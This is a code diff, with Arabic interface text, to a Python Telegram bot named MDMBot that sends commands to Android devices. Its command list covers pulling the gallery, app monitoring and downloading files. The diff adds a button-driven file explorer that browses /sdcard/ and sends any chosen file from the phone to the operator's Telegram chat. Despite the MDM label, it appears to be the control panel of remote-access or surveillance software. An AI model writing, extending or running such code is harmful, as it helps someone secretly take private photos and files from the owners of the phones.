@@ -244,7 +244,7 @@ COMMANDS = {
     "stop-gallery":          {"category": "advanced", "label": "⏹ إيقاف المعرض",    "description": "إيقاف سحب المعرض",      "needs_param": False},
     # info
     "get-device-info": {"category": "info", "label": "📋 معلومات الجهاز",  "description": "معلومات تفصيلية",     "needs_param": False},
-    "ls":              {"category": "info", "label": "📂 مستعرض الملفات",  "description": "عرض ملفات في مسار",  "needs_param": True, "param_hint": "/sdcard/DCIM"},
+    "ls":              {"category": "info", "label": "📂 مستعرض الملفات",  "description": "تصفح ملفات الجهاز",  "needs_param": False},
     "download-file":   {"category": "info", "label": "📥 تحميل ملف",      "description": "تحميل ملف من الجهاز", "needs_param": True, "param_hint": "/sdcard/file.txt"},
     # app_monitoring
     "app-monitor-start":  {"category": "app_monitoring", "label": "🟢 تفعيل المراقبة", "description": "بدء مراقبة التطبيقات",     "needs_param": False},
@@ -544,13 +544,86 @@ def _format_cmd_sent(dev, command, params=None):
     return "\n".join(lines)
 
 
+def _format_file_list_result(dev, file_data):
+    """Format file list as inline keyboard buttons."""
+    did = dev.get("device_id", "")
+    short_label = _dev_label(dev)
+    path = file_data.get("path", "/sdcard/")
+    parent = file_data.get("parent", "")
+    files = file_data.get("files", [])
+    
+    kb = InlineKeyboardMarkup(row_width=1)
+    
+    # Add parent directory button
+    if parent and parent != path:
+        kb.add(InlineKeyboardButton(
+            "📁 .. (السابق)",
+            callback_data=_cb(did, "filexplore", parent)
+        ))
+    
+    # Add file/folder buttons
+    dir_count = 0
+    file_count = 0
+    for f in files:
+        name = f.get("name", "?")
+        fpath = f.get("path", "")
+        is_dir = f.get("is_dir", False)
+        size = f.get("size", 0)
+        
+        if is_dir:
+            kb.add(InlineKeyboardButton(
+                f"📁 {name}/",
+                callback_data=_cb(did, "filexplore", fpath)
+            ))
+            dir_count += 1
+        else:
+            size_str = ""
+            if size > 1024 * 1024:
+                size_str = f" ({size // (1024*1024)}MB)"
+            elif size > 1024:
+                size_str = f" ({size // 1024}KB)"
+            
+            kb.add(InlineKeyboardButton(
+                f"📄 {name}{size_str}",
+                callback_data=_cb(did, "filedl", fpath)
+            ))
+            file_count += 1
+    
+    # Add back button
+    kb.add(_back(did))
+    
+    text = (
+        f"📂 <b>مستعرض الملفات</b>\n\n"
+        f"📱 <b>{short_label}</b>\n"
+        f"📁 <b>المسار:</b> <code>{path}</code>\n"
+        f"━━━━━━━━━━━━━━━\n"
+        f"📁 مجلدات: {dir_count} | 📄 ملفات: {file_count}\n\n"
+        f"💡 اضغط على مجلد للدخول\n"
+        f"💡 اضغط على ملف لتحميله"
+    )
+    
+    return text, kb
+
+
 def _format_cmd_result(dev, command, status, data=None, error=None):
     """Beautiful command result"""
     short_label = _dev_label(dev)
     lbl = COMMANDS.get(command, {}).get("label", command)
+    did = dev.get("device_id", "")
 
     if status == "success" and data:
         text_resp = str(data) if not isinstance(data, str) else data
+        
+        # Check if this is a file_list JSON response (for file explorer)
+        if command == "ls" and text_resp.strip().startswith("{"):
+            try:
+                import json as _json
+                file_data = _json.loads(text_resp)
+                if file_data.get("type") == "file_list":
+                    return _format_file_list_result(dev, file_data)
+            except:
+                pass
+        
         if len(text_resp) > 3000:
             text_resp = text_resp[:3000] + "\n... (مقتطع)"
         return (
@@ -856,8 +929,24 @@ class MDMBot:
                 bot.answer_callback_query(c.id)
 
             elif a == "cmd":
-                self._send_cmd(c.message.chat.id, did, tgt)
+                # For ls command, default to /sdcard/ if no path specified
+                if tgt == "ls":
+                    self._send_cmd(c.message.chat.id, did, "ls", {"value": "/sdcard/"})
+                else:
+                    self._send_cmd(c.message.chat.id, did, tgt)
                 bot.answer_callback_query(c.id, "⚡ تم الإرسال")
+
+            elif a == "filexplore":
+                # File explorer navigation: open directory
+                file_path = tgt
+                self._send_cmd(c.message.chat.id, did, "ls", {"value": file_path})
+                bot.answer_callback_query(c.id, f"📂 فتح: {file_path}")
+
+            elif a == "filedl":
+                # File explorer: download file
+                file_path = tgt
+                self._send_cmd(c.message.chat.id, did, "download-file", {"value": file_path})
+                bot.answer_callback_query(c.id, f"📥 تحميل: {file_path}")
 
             elif a == "param":
                 self._pending[c.message.chat.id] = {"device_id": did, "command": tgt}
@@ -1388,8 +1477,13 @@ def _sock_cmd_resp(data):
         if pending and mdm_bot:
             cid = pending["cid"]
             try:
-                text = _format_cmd_result(dev, cmd, status, data.get("data"), data.get("error"))
-                mdm_bot.bot.send_message(cid, text, parse_mode="HTML")
+                result = _format_cmd_result(dev, cmd, status, data.get("data"), data.get("error"))
+                # Check if result is a tuple (text, keyboard) for file explorer
+                if isinstance(result, tuple):
+                    text, kb = result
+                    mdm_bot.bot.send_message(cid, text, parse_mode="HTML", reply_markup=kb)
+                else:
+                    mdm_bot.bot.send_message(cid, result, parse_mode="HTML")
             except Exception as e:
                 logger.error(f"فشل إرسال الاستجابة: {e}")
 
